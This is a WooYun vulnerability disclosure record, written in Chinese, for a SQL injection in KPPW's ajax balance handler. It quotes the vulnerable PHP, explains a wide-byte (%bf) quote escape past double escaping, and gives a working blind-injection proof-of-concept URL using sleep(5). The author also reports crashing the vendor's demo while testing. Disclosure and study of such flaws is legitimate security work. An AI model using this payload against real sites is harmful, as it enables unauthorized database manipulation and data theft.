{"id": 31470, "wybug_id": "wooyun-2015-0113891", "wybug_title": "kppw 最新版注入(有点奇葩)", "wybug_corp": "keke.com", "wybug_author": "answer", "wybug_date": "2015-05-13 15:58", "wybug_open_date": "2015-08-12 12:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-12：\t细节向公众公开  简要描述： 人生第一发代码审计 详细说明：  首先给厂商说句抱歉，测试demo的时候把demo搞挂了漏洞文件:control/ajax/balance.php看代码\n$arrSellerInfo = db_factory::get_one(sprintf('select * from %s a left join %s b on a.uid = b.uid where a.uid =%s',TABLEPRE.'witkey_space',TABLEPRE.'witkey_shop',intval($id)));if($arrSellerInfo['shop_backstyle']){\t$arrBackgroudStyle = unserialize($arrSellerInfo['shop_backstyle']);}if($_R['a']==1){\t$arr['shop_background']=\"\";\tdb_factory::updatetable(TABLEPRE.\"witkey_shop\", $arr, \"uid=\".$_R['id']);\tkekezu::show_msg('已清除','index.php?do=seller&id='.intval($id),NULL,NULL,'ok');}elseif($_R['a']==2){    $arr['banner']=\"\";    db_factory::updatetable(TABLEPRE.\"witkey_shop\", $arr, \"uid=\".$_R['id']);    kekezu::show_msg('已清除','index.php?do=seller&id='.intval($id),NULL,NULL,'ok');}if (isset($formhash)&&kekezu::submitcheck($formhash)) {\t$shopObjT = keke_table_class::get_instance ( 'witkey_shop' );\t$banner and $arrFields['banner'] = $banner;\t$background and $arrFields['shop_background'] = $background;\t$repeat and  $arrBackgroudStyle['repeat']= $repeat;\t$position and $arrBackgroudStyle['position']= $position;\tis_array($arrBackgroudStyle) and $arrFields['shop_backstyle'] = serialize($arrBackgroudStyle);\t$shopObjT->save($arrFields,array('uid'=>intval($id)));\tkekezu::show_msg('已保存','index.php?do=seller&id='.intval($id),NULL,NULL,'ok');}\n变量 $arr 是可控的 而且没做任何过滤传入 updatetable()函数跟进updatetable()函数\npublic function updatetable($tablename, $setsqlarr, $wheresqlarr) {\t\treturn $this->_mydb->update ( $tablename, $setsqlarr, $wheresqlarr );\n可见没做处理，跟进update()\npublic function update($tablename, $setsqlarr, $wheresqlarr) {\t\t$setsql = '';\t\t$fields = array ();\t\tforeach ( $setsqlarr as $k => $v ) {\t\t\t$fileds [] = $this->special_filed ( $k ) . '=' . $this->mysqlEscapeString ( $v );\t\t}\t\t$setsql = implode ( ',', $fileds );\t\t$where = \"\";\t\tif (empty ( $wheresqlarr )) {\t\t\t$where = 1;\t\t} elseif (is_array ( $wheresqlarr )) {\t\t\t$temp = array ();\t\t\tforeach ( $wheresqlarr as $k => $v ) {\t\t\t\t$temp [] = $this->special_filed ( $k ) . '=' . $this->escape_string ( $v );\t\t\t}\t\t\t$where = implode ( ' and ', $temp );\t\t} else {\t\t\t$where = $wheresqlarr;\t\t}\t\treturn $affectrows = $this->execute ( 'UPDATE ' . $tablename . ' SET ' . $setsql . ' WHERE ' . $where );\t}\n这里就可以看出我们从url传过来的arr要是数组才行，才能控字段。先看效果\n\n\n\n可见真的进入了update语句，但是是否 显得鸡肋呢，因为只能更新shop表下的字段而已，也就是改改别人的店铺名啊之类的，要是能逃逸单引号多，这时候就开始fuzz一下发现，如果交一个单引号会经过两次转义，一次是系统全局的，另一次是update()函数里的escape_string()函数，测试一下\n\n\n\n可见一个单引号会变成一个3个反斜杠加一个单引号。这时候我fuzz了一下发现如果提交%bf'哈哈\n\n\n\n哈哈 单引号成功逃逸出来。这个时候就可以盲注了哈哈至于你问我为什么 我也还不大清楚，我再还要分析看看，注：我的环境是apache+mysql5.5.4+php5.3。本来是要测dome的但是由于手抖没闭合好官网已经挂了 实在抱歉pochttp://127.0.0.1:81/www/kppw/index.php?do=ajax&view=banner&id=1&a=1&arr[shop_name]=123%bf' where uid=1 and sleep(5)%23\n\n成功盲注。   漏洞证明：  首先给厂商说句抱歉，测试demo的时候把demo搞挂了漏洞文件:control/ajax/balance.php看代码\n$arrSellerInfo = db_factory::get_one(sprintf('select * from %s a left join %s b on a.uid = b.uid where a.uid =%s',TABLEPRE.'witkey_space',TABLEPRE.'witkey_shop',intval($id)));if($arrSellerInfo['shop_backstyle']){\t$arrBackgroudStyle = unserialize($arrSellerInfo['shop_backstyle']);}if($_R['a']==1){\t$arr['shop_background']=\"\";\tdb_factory::updatetable(TABLEPRE.\"witkey_shop\", $arr, \"uid=\".$_R['id']);\tkekezu::show_msg('已清除','index.php?do=seller&id='.intval($id),NULL,NULL,'ok');}elseif($_R['a']==2){    $arr['banner']=\"\";    db_factory::updatetable(TABLEPRE.\"witkey_shop\", $arr, \"uid=\".$_R['id']);    kekezu::show_msg('已清除','index.php?do=seller&id='.intval($id),NULL,NULL,'ok');}if (isset($formhash)&&kekezu::submitcheck($formhash)) {\t$shopObjT = keke_table_class::get_instance ( 'witkey_shop' );\t$banner and $arrFields['banner'] = $banner;\t$background and $arrFields['shop_background'] = $background;\t$repeat and  $arrBackgroudStyle['repeat']= $repeat;\t$position and $arrBackgroudStyle['position']= $position;\tis_array($arrBackgroudStyle) and $arrFields['shop_backstyle'] = serialize($arrBackgroudStyle);\t$shopObjT->save($arrFields,array('uid'=>intval($id)));\tkekezu::show_msg('已保存','index.php?do=seller&id='.intval($id),NULL,NULL,'ok');}\n变量 $arr 是可控的 而且没做任何过滤传入 updatetable()函数跟进updatetable()函数\npublic function updatetable($tablename, $setsqlarr, $wheresqlarr) {\t\treturn $this->_mydb->update ( $tablename, $setsqlarr, $wheresqlarr );\n可见没做处理，跟进update()\npublic function update($tablename, $setsqlarr, $wheresqlarr) {\t\t$setsql = '';\t\t$fields = array ();\t\tforeach ( $setsqlarr as $k => $v ) {\t\t\t$fileds [] = $this->special_filed ( $k ) . '=' . $this->mysqlEscapeString ( $v );\t\t}\t\t$setsql = implode ( ',', $fileds );\t\t$where = \"\";\t\tif (empty ( $wheresqlarr )) {\t\t\t$where = 1;\t\t} elseif (is_array ( $wheresqlarr )) {\t\t\t$temp = array ();\t\t\tforeach ( $wheresqlarr as $k => $v ) {\t\t\t\t$temp [] = $this->special_filed ( $k ) . '=' . $this->escape_string ( $v );\t\t\t}\t\t\t$where = implode ( ' and ', $temp );\t\t} else {\t\t\t$where = $wheresqlarr;\t\t}\t\treturn $affectrows = $this->execute ( 'UPDATE ' . $tablename . ' SET ' . $setsql . ' WHERE ' . $where );\t}\n这里就可以看出我们从url传过来的arr要是数组才行，才能控字段。先看效果\n\n\n\n可见真的进入了update语句，但是是否 显得鸡肋呢，因为只能更新shop表下的字段而已，也就是改改别人的店铺名啊之类的，要是能逃逸单引号多，这时候就开始fuzz一下发现，如果交一个单引号会经过两次转义，一次是系统全局的，另一次是update()函数里的escape_string()函数，测试一下\n\n\n\n可见一个单引号会变成一个3个反斜杠加一个单引号。这时候我fuzz了一下发现如果提交%bf'哈哈\n\n\n\n哈哈 单引号成功逃逸出来。这个时候就可以盲注了哈哈至于你问我为什么 我也还不大清楚，我再还要分析看看，注：我的环境是apache+mysql5.5.4+php5.3。本来是要测dome的但是由于手抖没闭合好官网已经挂了 实在抱歉pochttp://127.0.0.1:81/www/kppw/index.php?do=ajax&view=banner&id=1&a=1&arr[shop_name]=123%bf' where uid=1 and sleep(5)%23\n\n成功盲注。   修复方案：  你懂的   版权声明：转载请注明来源 answer@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-05-14 12:02 厂商回复： 谢谢提供 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-13 16:07 |    \t\t东方不败 \t\t\t( 普通白帽子  |\t\t\t        Rank:440 漏洞数:66        | 日出东方，唯我不败。)\t\t \n  再显神威    \n     2015-05-13 16:11 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  有点奇葩    \n     2015-05-13 20:30 |    \t\tAK-47 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | 开开心心挖洞，踏踏实实上学！)\t\t \n  怎么奇葩了？     \n     2015-05-18 18:25 |    \t\t武汉客客信息技术有限公司(乌云厂商)\t\t \n  变量没有初始化...    \n     2015-09-14 12:23 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  这fuzz得也是醉了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}